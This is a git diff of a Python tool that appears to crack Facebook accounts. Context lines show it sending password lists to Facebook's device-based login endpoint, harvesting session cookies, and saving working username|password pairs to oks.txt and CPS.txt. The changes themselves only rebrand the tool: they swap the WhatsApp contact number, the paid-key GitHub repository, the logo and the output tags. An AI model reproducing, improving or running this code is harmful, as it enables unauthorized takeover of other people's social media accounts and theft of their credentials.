@@ -99,9 +99,9 @@ def main_apv():
         input('\n Press Enter For Approve Your Key ')
         time.sleep(3.5)
         tks = 'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium%20Version%201.0.0%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt
-        os.system('am start https://wa.me/+2349017624430?text=' + tks)        
+        os.system('am start https://wa.me/+2349025196405?text=' + tks)        
 
-    r1=requests.get("https://raw.githubusercontent.com/Rydah300/Paid/main/Apv.txt").text
+    r1=requests.get("https://raw.githubusercontent.com/Ancestors45/Paid/main/Apv.txt").text
     if key1 in r1:
         sarfraz()
     else:
@@ -119,12 +119,12 @@ def main_apv():
 
         tks = 'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium%20Version%201.0.0%20My%20%20Key%20%20:%20'+ak+''+key1
 
-        os.system('am start https://wa.me/+2349017624430?text=' + tks)
+        os.system('am start https://wa.me/+2349025196405?text=' + tks)
 logo ="""   
-    •••••••
-    •••••••
-    •••••••
-    •••••••"""
+   __    _  _   ___  ____  ___  ____  _____  ____  ___       ___  __    _____  _  _  ____ """
+  /__\  ( \( ) / __)( ___)/ __)(_  _)(  _  )(  _ \/ __)     / __)(  )  (  _  )( \( )( ___)
+ /(  )\  )  ( ( (__  )__) \__ \  )(   )(_)(  )   /\__ \    ( (__  )(__  )(_)(  )  (  )__) 
+(__)(__)(_)\_) \___)(____)(___/ (__) (_____)(_)\_)(___/     \___)(____)(_____)(_)\_)(____)
 
 def hasil(OK,cp):
 	if not len(OK) != 0:
@@ -176,7 +176,7 @@ class __xxx__:
             self.sarfrazx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write('\r\033[1;32m [ UR-NAME ] \033[1;97m%s|%s [OK:-%s]\033[1;97m[CP:-0] '%(loop,len(self.id),len(ok))),
+        sys.stdout.write('\r\033[1;32m [ ANCESTORS ] \033[1;97m%s|%s [OK:-%s]\033[1;97m[CP:-0] '%(loop,len(self.id),len(ok))),
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -226,7 +226,7 @@ class __xxx__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f"\r{H} [ URNAME-OK ] {user} | {pw}")
+                    print(f"\r{H} [ ANCESTORS-OK ] {user} | {pw}")
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
                     open('oks.txt' , 'a').write('%s\n' % wrt)
@@ -238,7 +238,7 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s [ URNAME-CP ] %s | %s ' % (H, user, pw))
+                        print('\r%s [ ANCESTORS-CP ] %s | %s ' % (H, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
                         open('CPS.txt' , 'a').write('%s\n' % wrt)
@@ -249,7 +249,7 @@ class __xxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s [ URNAME-OK ] %s | %s ' % (H, user, pw))
+                    print('\r%s [ ACENSTORS-OK ] %s | %s ' % (H, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
                     open('oks.txt' , 'a').write('%s\n' % wrt)
